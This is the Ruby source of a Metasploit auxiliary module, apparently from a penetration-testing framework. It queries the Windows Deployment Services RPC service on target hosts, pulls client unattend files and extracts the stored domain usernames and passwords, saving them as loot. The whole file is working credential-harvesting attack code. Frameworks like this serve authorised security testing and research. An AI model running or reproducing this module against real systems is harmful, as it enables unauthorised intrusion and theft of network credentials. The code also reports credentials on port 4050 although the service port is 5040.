##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/dcerpc'
require 'rex/proto/dcerpc/wdscp'
require 'rex/parser/unattend'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  DCERPCPacket   	= Rex::Proto::DCERPC::Packet
  DCERPCClient   	= Rex::Proto::DCERPC::Client
  DCERPCResponse 	= Rex::Proto::DCERPC::Response
  DCERPCUUID     	= Rex::Proto::DCERPC::UUID
  WDS_CONST 		= Rex::Proto::DCERPC::WDSCP::Constants

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
      'Description'    => %q{
            This module retrieves the client unattend file from Windows
            Deployment Services RPC service and parses out the stored credentials.
            Tested against Windows 2008 R2, 64-bit.
      },
      'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
      'License'        => MSF_LICENSE,
      'Version'        => '',
      'References'     =>
        [
          [ 'MSDN', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],
          [ 'URL', 'http://rewtdance.blogspot.co.uk/2012/11/windows-deployment-services-clear-text.html']
        ],
      ))

    register_options(
      [
        Opt::RPORT(5040),
      ], self.class)

    deregister_options('RHOST', 'CHOST', 'CPORT', 'SSL', 'SSLVersion')

    register_advanced_options(
      [
        OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not currently supported by Windows and will cause an error in System Event Log)', false])
      ], self.class)
  end

  def run_host(ip)
      begin
        query_host(ip)
      rescue ::Interrupt
          raise $!
      rescue ::Exception => e
          print_error("#{ip}:#{rport} error: #{e}")
      end
  end

  def query_host(rhost)
    # Create a handler with our UUID and Transfer Syntax
    self.handle = Rex::Proto::DCERPC::Handle.new(
      [
        WDS_CONST::WDSCP_RPC_UUID,
        '1.0',
        '71710533-beba-4937-8319-b5dbef9ccc36',
        1
      ],
      'ncacn_ip_tcp',
      rhost,
      [datastore['RPORT']]
    )

    print_status("Binding to #{handle} ...")

    self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
    print_good("Bound to #{handle}")

    report_service(
        :host => rhost,
        :port => datastore['RPORT'],
        :proto => 'tcp',
        :name => "dcerpc",
        :info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
    )

    table = Rex::Ui::Text::Table.new({
      'Header' => 'Windows Deployment Services',
      'Indent' => 1,
      'Columns' => ['Architecture', 'Type', 'Domain', 'Username', 'Password']
    })

    creds_found = false

    WDS_CONST::ARCHITECTURE.each do |architecture|
      if architecture[0] == :ARM && !datastore['ENUM_ARM']
        vprint_status "Skipping #{architecture[0]} architecture due to adv option"
        next
      end

      begin
        result = request_client_unattend(architecture)
      rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
        vprint_error(e.to_s)
        print_error("#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
        return
      end

      unless result.nil?
        loot_unattend(architecture[0], result)
        results = parse_client_unattend(result)

        results.each do |result|
          unless result.empty?
            unless result['username'].nil? || result['password'].nil?
              print_good("Retrived #{result['type']} credentials for #{architecture[0]}")
              creds_found = true
              domain = ""
              domain = result['domain'] if result['domain']
              report_creds(domain, result['username'], result['password'])
              table << [architecture[0], result['type'], domain, result['username'], result['password']]
            end
          end
        end
      end
    end

    if creds_found
      print_line
      table.print
      print_line
    else
      print_error("No Unattend files received, service is unlikely to be configured for completely unattended installation.")
    end
  end

  def request_client_unattend(architecture)
    # Construct WDS Control Protocol Message
    packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)
    packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, [architecture[1]].pack('C'))
    packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_GUID,
            "\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00"\
            "\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00"\
            "\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00"\
            "\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00"\
            "\x00\x00")
    packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_MAC,
            "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
            "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
            "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00"\
            "\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00"\
            "\x00\x00")
    packet.add_var(	WDS_CONST::VAR_NAME_VERSION,"\x00\x00\x00\x01\x00\x00\x00\x00")
    wdsc_packet = packet.create

    print_status("Sending #{architecture[0]} Client Unattend request ...")
    response = dcerpc.call(0, wdsc_packet)

    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
      vprint_status('Received response ...')
      data = dcerpc.last_response.stub_data

      # Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000
      op_error_code = data.unpack('i*')[18]
      if op_error_code == 0
        if data.length < 277
          vprint_error("No Unattend received for #{architecture[0]} architecture")
          return nil
        else
          vprint_status("Received #{architecture[0]} unattend file ...")
          return extract_unattend(data)
        end
      else
        vprint_error("Error code received for #{architecture[0]}: #{op_error_code}")
        return nil
      end
    end
  end

  def extract_unattend(data)
    start = data.index('<?xml')
    finish = data.index('</unattend>')+10
    return data[start..finish]
  end

  def parse_client_unattend(data)
    begin
      xml = REXML::Document.new(data)

      rescue REXML::ParseException => e
          print_error("Invalid XML format")
          vprint_line(e.message)
      end

    return Rex::Parser::Unattend.parse(xml).flatten
  end

  def loot_unattend(archi, data)
      return if data.empty?
      p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
      print_status("Raw version of #{archi} saved as: #{p}")
  end

  def report_creds(domain, user, pass)
    report_auth_info(
        :host  => rhost,
        :port => 4050,
        :sname => 'dcerpc',
        :proto => 'tcp',
        :source_id => nil,
        :source_type => "aux",
        :user => "#{domain}\\#{user}",
        :pass => pass)
  end
end
